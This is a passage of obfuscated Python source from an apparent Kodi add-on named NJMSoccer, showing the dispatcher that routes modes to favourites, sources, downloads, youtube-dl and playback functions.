 if 26 - 26: OOooOOo % iii1I1I + iii1I1I % O00oOoOoO0o0O * i11iIiiIii / Oo0ooO0oo0oO
elif IIIIIiI11Ii == 5 :
 III1ii1iII ( "addFavorite" )
 try :
  iI1i11iII111 = iI1i11iII111 . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  iI1i11iII111 = iI1i11iII111 . split ( '  - ' ) [ 0 ]
 except :
  pass
 i1iIIII1iiIIi ( iI1i11iII111 , Ii1I1Ii , oOo0 , o0O0OOO0Ooo , ooO0 )
 if 64 - 64: Ii1I % oO0o / oO0OooOoO % i11Ii11I1Ii1i - Oo0ooO0oo0oO
elif IIIIIiI11Ii == 6 :
 III1ii1iII ( "rmFavorite" )
 try :
  iI1i11iII111 = iI1i11iII111 . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  iI1i11iII111 = iI1i11iII111 . split ( '  - ' ) [ 0 ]
 except :
  pass
 ii1I ( iI1i11iII111 )
 if 2 - 2: II - I11i + OOooOOo * I1ii11iIi11i / Oo0ooO0oo0oO
elif IIIIIiI11Ii == 7 :
 III1ii1iII ( "addSource" )
 I1I11 ( Ii1I1Ii )
 if 26 - 26: iii1I1I * oOo0O0Ooo
elif IIIIIiI11Ii == 8 :
 III1ii1iII ( "rmSource" )
 iIiIIi1 ( iI1i11iII111 )
 if 31 - 31: O00oOoOoO0o0O * Ii1I . O0oo0OO0
elif IIIIIiI11Ii == 9 :
 III1ii1iII ( "download_file" )
 Iii1IIIIIII ( iI1i11iII111 , Ii1I1Ii )
 if 35 - 35: O00oOoOoO0o0O
elif IIIIIiI11Ii == 10 :
 III1ii1iII ( "getCommunitySources" )
 oOooO0 ( )
 if 94 - 94: i11Ii11I1Ii1i / i11iIiiIii % O0
elif IIIIIiI11Ii == 11 :
 III1ii1iII ( "addSource" )
 I1I11 ( Ii1I1Ii )
 if 70 - 70: O00oOoOoO0o0O - oOo0O0Ooo / OoooooooOO % OoooooooOO
elif IIIIIiI11Ii == 12 :
 III1ii1iII ( "setResolvedUrl" )
 if not Ii1I1Ii . startswith ( "plugin://plugin" ) or not any ( x in Ii1I1Ii for x in IIiIiII11i ) :
  II1i = xbmcgui . ListItem ( path = Ii1I1Ii )
  xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , II1i )
 else :
  xbmc . executebuiltin ( 'XBMC.RunPlugin(' + Ii1I1Ii + ')' )
  if 95 - 95: OoooooooOO % OoooooooOO . O0oo0OO0
  if 26 - 26: Ii1I + I1i1iI1i - oO0OooOoO . oO0OooOoO + I11i + oO0o
elif IIIIIiI11Ii == 13 :
 III1ii1iII ( "play_playlist" )
 OoO0OOoO0Oo0 ( iI1i11iII111 , I1i11ii11 )
 if 68 - 68: O0
elif IIIIIiI11Ii == 14 :
 III1ii1iII ( "get_xml_database" )
 Oo0oO00o ( Ii1I1Ii )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 76 - 76: I11i
elif IIIIIiI11Ii == 15 :
 III1ii1iII ( "browse_xml_database" )
 Oo0oO00o ( Ii1I1Ii , True )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 99 - 99: OOooOOo
elif IIIIIiI11Ii == 16 :
 III1ii1iII ( "browse_community" )
 oOooO0 ( True )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 1 - 1: O0oo0OO0 * oO0o * I1ii11iIi11i + oOo0O0Ooo
elif IIIIIiI11Ii == 17 :
 III1ii1iII ( "getRegexParsed" )
 Ii1I1Ii , OOo = I11I ( O0o , Ii1I1Ii )
 if Ii1I1Ii :
  I1i1iI ( Ii1I1Ii , iI1i11iII111 , oOo0 , OOo )
 else :
  xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,Failed to extract regex. - " + "this" + ",4000," + oO + ")" )
elif IIIIIiI11Ii == 18 :
 III1ii1iII ( "youtubedl" )
 try :
  import youtubedl
 except Exception :
  xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,Please [COLOR yellow]install Youtube-dl[/COLOR] module ,10000," ")" )
 OOoOO0ooo = youtubedl . single_YD ( Ii1I1Ii )
 I1i1iI ( OOoOO0ooo , iI1i11iII111 , oOo0 )
elif IIIIIiI11Ii == 19 :
 III1ii1iII ( "Genesiscommonresolvers" )
 I1i1iI ( OooOOOO ( Ii1I1Ii ) , iI1i11iII111 , oOo0 , True )
 if 90 - 90: II % oOo0O0Ooo - oOo0O0Ooo . iIii1I11I1II1 / iii1I1I + O00oOoOoO0o0O
elif IIIIIiI11Ii == 21 :
 III1ii1iII ( "download current file using youtube-dl service" )
 ii1IIiII111I ( '' , iI1i11iII111 , 'video' )
elif IIIIIiI11Ii == 23 :
 III1ii1iII ( "get info then download" )
 ii1IIiII111I ( Ii1I1Ii , iI1i11iII111 , 'video' )
elif IIIIIiI11Ii == 24 :
 III1ii1iII ( "Audio only youtube download" )
 ii1IIiII111I ( Ii1I1Ii , iI1i11iII111 , 'audio' )
elif IIIIIiI11Ii == 25 :
 III1ii1iII ( "YouTube/DMotion" )
 iiIiii ( Ii1I1Ii )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
elif IIIIIiI11Ii == 26 :
 III1ii1iII ( "YouTube/DMotion From Search History" )
 iI1i11iII111 = iI1i11iII111 . split ( ':' )
 iiIiii ( Ii1I1Ii , search_term = iI1i11iII111 [ 1 ] )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
elif IIIIIiI11Ii == 27 :
 III1ii1iII ( "Using IMDB id to play in Pulsar" )
 o0o00OOOO = iiIiii ( Ii1I1Ii )
 xbmc . Player ( ) . play ( o0o00OOOO )
elif IIIIIiI11Ii == 30 :
 Ii ( iI1i11iII111 , Ii1I1Ii , oOo0 , o0O0OOO0Ooo )
 if 42 - 42: i11Ii11I1Ii1i * Oo0ooO0oo0oO
elif IIIIIiI11Ii == 35 :
 O0000oO0o00 = Oo0O0OOOoo ( Ii1I1Ii )
 OOoO000O0OO ( O0000oO0o00 )
 if 2 - 2: Oo0ooO0oo0oO . I1ii11iIi11i / Ii1I
elif IIIIIiI11Ii == 36 :
 IIO000oooOO0Oo0 = I1I1i1i ( )
 IIO000oooOO0Oo0 . doModal ( )
 del IIO000oooOO0Oo0
 if 31 - 31: I1i1iI1i - I1ii11iIi11i / iii1I1I . i1IIi / O0oo0OO0
 if 66 - 66: I1ii11iIi11i
elif IIIIIiI11Ii == 40 :
 OOOOO0O00 ( )
 o00Oo0oooooo ( )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 72 - 72: II
elif IIIIIiI11Ii == 53 :
 III1ii1iII ( "Requesting JSON-RPC Items" )
 OoO ( Ii1I1Ii )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 91 - 91: oO0OooOoO / I1i1iI1i + iIii1I11I1II1 . O00oOoOoO0o0O - O0
elif IIIIIiI11Ii == 53 :
 Movies123 ( )
 if 70 - 70: O0oo0OO0 * Ii1I - O00oOoOoO0o0O + oOo0O0Ooo % I11i - I1i1iI1i
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
]')